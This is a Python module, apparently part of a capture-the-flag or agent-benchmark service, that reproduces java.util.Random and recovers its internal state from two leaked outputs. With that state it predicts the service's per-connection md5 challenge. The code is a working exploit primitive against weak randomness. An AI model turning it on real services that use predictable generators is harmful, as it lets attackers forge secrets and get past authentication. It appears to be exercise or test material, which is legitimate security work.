"""Pure-Python prediction of the service's java.util.Random — the BLIND attack
primitive for 8-bit-oracle.

Per connection the Java service builds its secret `challenge` as
`md5(transform(rnd.nextInt()))` with a vanilla `java.util.Random`. The `STATS`
command leaks `transform(rnd.nextInt())` as a hex uuid. Two consecutive STATS
calls give two consecutive `nextInt()` outputs; from them the 48-bit LCG state is
recovered by brute-forcing the 16 truncated low bits, after which every future
`nextInt()` — hence every future `challenge` — is predictable.

`transform(n)`: n<=0 -> |2n| (even); n>0 -> |2n-1| (odd). Invertible, so the hex
uuid recovers the exact signed int `nextInt()` returned.

This module is stdlib-only and is used both by the FlagHandler's self-test path
and as the reference algorithm the attack prompt describes.
"""
from __future__ import annotations

import hashlib

_MASK = (1 << 48) - 1
_MULT = 0x5DEECE66D
_ADD = 0xB


class _JRandom:
    """Mirror of java.util.Random, seeded directly to a raw 48-bit state."""

    __slots__ = ("seed",)

    def __init__(self, raw_state: int):
        self.seed = raw_state & _MASK

    def _next(self, bits: int) -> int:
        self.seed = (self.seed * _MULT + _ADD) & _MASK
        return self.seed >> (48 - bits)

    def next_int(self) -> int:
        v = self._next(32)
        if v >= (1 << 31):
            v -= 1 << 32
        return v


def transform(n: int) -> int:
    """Util.transform: n<=0 -> |2n|, n>0 -> |2n-1|."""
    if n <= 0:
        return abs(n * 2)
    return abs(n * 2 - 1)


def untransform(t: int) -> int:
    """Invert transform: even -> n=-t/2 (n<=0); odd -> n=(t+1)/2 (n>0)."""
    if t % 2 == 0:
        return -(t // 2)
    return (t + 1) // 2


def uuid_to_int(uuid_hex: str) -> int:
    """A leaked STATS uuid (hex of transform(nextInt())) -> the signed nextInt()."""
    return untransform(int(uuid_hex, 16))


def recover_after(int1: int, int2: int) -> _JRandom | None:
    """Recover the RNG state right AFTER two consecutive nextInt() outputs.

    Returns a _JRandom whose next next_int() == the service's third nextInt(),
    or None if the 16-bit search didn't yield a unique state.
    """
    u1 = int1 & 0xFFFFFFFF
    u2 = int2 & 0xFFFFFFFF
    high = u1 << 16
    found = None
    for low in range(1 << 16):
        seed1 = high | low
        seed2 = (seed1 * _MULT + _ADD) & _MASK
        if (seed2 >> 16) == u2:
            if found is not None:
                return None  # non-unique; caller can retry with fresh STATS
            found = seed2
    if found is None:
        return None
    return _JRandom(found)


def challenge_for(next_int: int) -> str:
    """md5(transform(nextInt())) hex — the per-connection challenge string."""
    return hashlib.md5(str(transform(next_int)).encode()).hexdigest()
